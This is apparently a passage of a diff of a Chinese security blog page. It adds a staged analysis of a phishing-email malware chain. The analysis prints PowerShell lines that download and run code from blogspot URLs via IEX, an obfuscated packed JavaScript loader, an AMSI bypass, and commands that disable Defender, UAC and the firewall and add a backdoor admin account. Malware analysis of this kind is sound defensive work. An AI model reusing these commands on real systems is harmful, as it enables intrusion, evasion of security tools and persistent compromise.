+        -&gt; Defender后缀加白:&quot;.bat&quot;,&quot;.ppam&quot;,&quot;.xls&quot;,&quot;.docx&quot;,&quot;.bat&quot;,&quot;.exe&quot;,&quot;.vbs&quot;,&quot;.js&quot;,路径加白:&quot;C:\&quot;,&quot;D:\&quot;,&quot;E:\&quot;,进程加白:&quot;explorer.exe&quot;,&quot;kernel32.dll&quot;,&quot;kernel32.dll&quot;,&quot;aspnet_compiler.exe&quot;,&quot;cvtres.exe&quot;,&quot;CasPol.exe&quot;,&quot;csc.exe&quot;,&quot;csc.exe&quot;,&quot;Msbuild.exe&quot;,&quot;ilasm.exe&quot;,&quot;InstallUtil.exe&quot;,&quot;jsc.exe&quot;,&quot;Calc.exe&quot;,&quot;powershell.exe&quot;,&quot;rundll32.exe&quot;,&quot;conhost.exe&quot;,&quot;Cscript.exe&quot;,&quot;mshta.exe&quot;,&quot;cmd.exe&quot;,&quot;DefenderisasuckingAntivirus&quot;,&quot;wscript.exe&quot; IP加白:&quot;127.0.0.1&quot;
+        -&gt; Defender IDS关闭
+        -&gt; Defender关闭
+        -&gt; UAC限制开启 New-Ipublicroperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
+        -&gt; 停止WinDefend服务，取消WinDefend服务自启
+        -&gt; 创建用户System32 pwd:123添加到管理员,将创建的System32用户添加到&quot;Remote Desktop Users&quot;组
+        -&gt; 停止WinDefend服务，停止WdNisSvc服务，停止WdNisSvc服务，删除windefend服务
+        -&gt; 防火墙关闭
+</code></pre><p><img src="https://i.miji.bid/2023/08/07/8dac8d365b310d93269d96defc35bc89.png" alt=""><br><img src="https://i.miji.bid/2023/08/07/592b5898dfb4f6907f6bb866e7655ae0.png" alt=""><br><img src="https://i.miji.bid/2023/08/07/441f58300fbe730c550b6b13596a2bc6.png" alt=""></p>
+<p><strong>阶段3</strong><br>$X2</p>
+<pre><code>    -&gt; 三层hex解密js内容写入C:\ProgramData\MinMinons\miguan.js
+        -&gt; 计划任务运行miguan.js schtasks /create /sc MINUTE /mo 164 /tn miguaned /F /tr &quot;$helogamanunu C:\\ProgramData\\MinMinons\\miguan.js&quot;
+            -&gt; 5秒后计划执行powershell Schtasks.exe /create /sc minute /mo 120 /tn escansupdate /f /tr “wscript.exe //b //e:jscript c:\\programdata\\REDACTED\\windowsdefenderupdate.js”    powershell.exe    “c:\windows\system32\windowspowershell\v1.0\powershell.exe” -ep bypass -c (i’w’r(‘hxxps://powpowpowff.blogspot[.]com/atom.xml’) -useb) | .(‘{1}{0}’-f’ex’,’i’) | ping 127.0.0.1
+        -&gt; 将&quot;C:\\ProgramData\\MinMinons\&quot; 下所有文件复制到开机自启路径(Startup)
+        -&gt;删除C:\ProgramData\MinMinons\Candlegraphy.~___~
+        -&gt;删除C:\ProgramData\MinMinons\*.vbs
+        -&gt;删除C:\ProgramData\MinMinons\*.exe
+</code></pre><p><img src="https://i.miji.bid/2023/08/07/2d2fd253577209b45a6af9606d552608.png" alt=""></p>
+<pre><code> eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&#39;&#39;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#39;&#39;.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return  d[e]}];e=function(){return&#39;\\w+&#39;};c=1};while(c--){if(k[c]){p=p.replace(new  RegExp(&#39;\\b&#39;+e(c)+&#39;\\b&#39;,&#39;g&#39;),k[c])}}return p}(&#39;4=q(&quot;o:{n-m-l-g-j}&quot;);i[&quot;8&quot;](d);2=&quot;b&gt;h*^ -a  p&gt;&gt; -c (5\&#39;w\&#39;r(\&#39;k\&#39;) -u&gt;*B) |  .(\&#39;{x}{9}\&#39;.3(\&#39;9\&#39;,\&#39;0\&#39;).3(\&#39;x\&#39;,\&#39;1\&#39;)-f\&#39;6\&#39;,\&#39;%%\&#39;).3(\&#39;%%\&#39;,\&#39;5\&#39;).3(\&#39;6\&#39;,\&#39;t\&#39;) |  v  A.0.0.1&quot;;2=2.3(&quot;*&quot;,&quot;e&quot;);2=2.3(&quot;*&quot;,&quot;e&quot;);2=2.3(&quot;*&quot;,&quot;e&quot;);2=2.3(&quot;^&quot;,&quot;z&quot;);2=2.3(&quot;&gt;&quot;,&quot;s&quot;);2=2.3(&quot;&gt;&quot;,&quot;s&quot;);2=2.3(&quot;&gt;&quot;,&quot;s&quot;);2=2.3(&quot;&gt;&quot;,&quot;s&quot;);4[&quot;y&quot;](2,0,7);&#39;,38,38,&#39;||Jigijigi|replace|combackmyex|I|geleography|true|Sleep||eP|power||5000|||ADB9||WScript|00C04FD58A0B|https://billielishhui.blogspot.com/atom.xml|11D0|1CF0|F935DC22|new|Bypa|ActiveXObject|||EX||ping|||RUN|ll|127|&#39;.split(&#39;|&#39;),0,{}))
+</code></pre><p>全部流程：</p>
+<pre><code>1.ps1
+-&gt; 运行winword
+-&gt;延迟3秒
+-&gt; 删除C:\Users\*\Downloads\下的所有.docx文件
+-&gt; 删除C:\Users\*\Desktop\下的所有.docx文件
+-&gt; 创建C:\ProgramData\MinMinons
+-&gt;将$Gamilopera写入C:\ProgramData\MinMinons\Candlegraphy.~___~
+-&gt;IEX运行$Gamilopera变量
+    第一阶段:
+        -&gt;js内容三层hex解密
+        -&gt;js内容写入到C:\ProgramData\MinMinons\Microsoftupdate.js
+        -&gt;创建计划任务运行js schtasks /create /sc MINUTE /mo 180 /tn MOperaChrome /F /tr C:\ProgramData\MinMinons\Microsoftupdate.js
+        js阶段:
+            -&gt;ActiveXObject组件通过CLSID:{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}实例化wscript.Shell
+            -&gt;延迟3秒
+            -&gt;要运行的命令替换运行powershell-&gt; powershell -EP Bypass -c Get-Content -RAW C:\ProgramData\MinMinons\Candlegraphy.~___~ | .(&#39;{x}{9}&#39;.replace(&#39;9&#39;,&#39;0&#39;).replace(&#39;x&#39;,&#39;1&#39;)-f&#39;GIMGUL&#39;,&#39;%%&#39;).replace(&#39;%%&#39;,&#39;I&#39;).replace(&#39;GIMGUL&#39;,&#39;EX&#39;) | ping 127.0.0.1
+
+    第二阶段:
+        -&gt; [Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;).GetField(&#39;amsiInitFailed&#39;,&#39;NonPublic,Static&#39;).SetValue($null,$true) AMSI绕过
+        -&gt; 注册表设置COM口劫持amsi绕过 &#39;HKCU:\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32&#39; -N &#39;(Default)&#39; -V &quot;C:\IDontExist.dll&quot;
+        -&gt;解密两个.NET的PE，分别赋值变量$Ripple - 2.4.dll 和$$Ripple - chas.exe
+        -&gt;$Ripple .NET内存加载 2.4.dll nanamespace:A class:B Method:C
+            -&gt;A.B.C(&quot;C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe&quot;,[OBJECT[]]$Ripple)
+            -&gt;A.B.C(&quot;C:\Windows\Microsoft.NET\Framework\v2.0.50727\RegSvcs.exe&quot;,[OBJECT[]]$Ripple)
+            -&gt;A.B.C(&quot;C:\Windows\Microsoft.NET\Framework\v3.5\Msbuild.exe&quot;,[OBJECT[]]$Ripple)
+            内存加载实现将chas.exe进程注入到RegSvcs.exe和Msbuild.exe
+        -&gt;  注册表设置COM口劫持amsi绕过 &#39;HKCU:\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32&#39; -N &#39;(Default)&#39; -V &quot;C:\IDontExist.dll&quot;
+        -&gt; Defender后缀加白:&quot;.bat&quot;,&quot;.ppam&quot;,&quot;.xls&quot;,&quot;.docx&quot;,&quot;.bat&quot;,&quot;.exe&quot;,&quot;.vbs&quot;,&quot;.js&quot;,路径加白:&quot;C:\&quot;,&quot;D:\&quot;,&quot;E:\&quot;,进程加白:&quot;explorer.exe&quot;,&quot;kernel32.dll&quot;,&quot;kernel32.dll&quot;,&quot;aspnet_compiler.exe&quot;,&quot;cvtres.exe&quot;,&quot;CasPol.exe&quot;,&quot;csc.exe&quot;,&quot;csc.exe&quot;,&quot;Msbuild.exe&quot;,&quot;ilasm.exe&quot;,&quot;InstallUtil.exe&quot;,&quot;jsc.exe&quot;,&quot;Calc.exe&quot;,&quot;powershell.exe&quot;,&quot;rundll32.exe&quot;,&quot;conhost.exe&quot;,&quot;Cscript.exe&quot;,&quot;mshta.exe&quot;,&quot;cmd.exe&quot;,&quot;DefenderisasuckingAntivirus&quot;,&quot;wscript.exe&quot; IP加白:&quot;127.0.0.1&quot;
+        -&gt; Defender IDS关闭
+        -&gt; Defender关闭
+        -&gt; UAC限制开启 New-Ipublicroperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
+        -&gt; 停止WinDefend服务，取消WinDefend服务自启
+        -&gt; 创建用户System32 pwd:123添加到管理员,将创建的System32用户添加到&quot;Remote Desktop Users&quot;组
+        -&gt; 停止WinDefend服务，停止WdNisSvc服务，停止WdNisSvc服务，删除windefend服务
+        -&gt; 防火墙关闭
+
+    第三阶段:
+        -&gt; 三层hex解密js内容写入C:\ProgramData\MinMinons\miguan.js
+        -&gt; 计划任务运行miguan.js schtasks /create /sc MINUTE /mo 164 /tn miguaned /F /tr &quot;$helogamanunu C:\\ProgramData\\MinMinons\\miguan.js&quot;
+            -&gt; 5秒后计划执行powershell Schtasks.exe /create /sc minute /mo 120 /tn escansupdate /f /tr “wscript.exe //b //e:jscript c:\\programdata\\REDACTED\\windowsdefenderupdate.js”    powershell.exe    “c:\windows\system32\windowspowershell\v1.0\powershell.exe” -ep bypass -c (i’w’r(‘hxxps://powpowpowff.blogspot[.]com/atom.xml’) -useb) | .(‘{1}{0}’-f’ex’,’i’) | ping 127.0.0.1
+        -&gt; 将&quot;C:\\ProgramData\\MinMinons\&quot; 下所有文件复制到开机自启路径(Startup)
+        -&gt;删除C:\ProgramData\MinMinons\Candlegraphy.~___~
+        -&gt;删除C:\ProgramData\MinMinons\*.vbs
+        -&gt;删除C:\ProgramData\MinMinons\*.exe
+</code></pre><p>解密完这些混淆一共得到11个文件：<br><img src="https://i.miji.bid/2023/08/07/175cdd87acc81086917494a53043b979.png" alt=""></p>
+<p>powershell主要关注的</p>
+<pre><code>Function Bulega {
+    param($Bulegagone)
+    $Bulegagone =  -join ($Bulegagone -split &#39;(..)&#39; | ? { $_ } | % { [char][convert]::ToUInt32($_,16) })
+    return $Bulegagone
+}
+
+遍历混淆的十六进制编码进行解码
+
+
+.(&#39;{x}{9}&#39;.replace(&#39;9&#39;,&#39;0&#39;).replace(&#39;x&#39;,&#39;1&#39;)-f&#39;gomaliker&#39;,&#39;%%&#39;).replace(&#39;%%&#39;,&#39;I&#39;).replace(&#39;gomaliker&#39;,&#39;EX&#39;)
+IEX
+
+</code></pre>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
     </div>
@@ -2152,12 +2289,12 @@ sc sdset WeakService3 &quot;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCR
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>windows配置错误导致的提权</p>
+    <p><span class="copy-title">文章标题:</span>某钓鱼邮件分析</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-08-26, 14:36:36</p>
-    <p><span class="copy-title">最后更新:</span>2019-08-26, 16:50:15</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/34b370c6.html" title="windows配置错误导致的提权">http://jiushill.github.io/posts/34b370c6.html</a>
+    <p><span class="copy-title">发布时间:</span>2023-08-07, 14:53:28</p>
+    <p><span class="copy-title">最后更新:</span>2023-08-07, 15:30:40</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/6e8ca819.html" title="某钓鱼邮件分析">http://jiushill.github.io/posts/6e8ca819.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
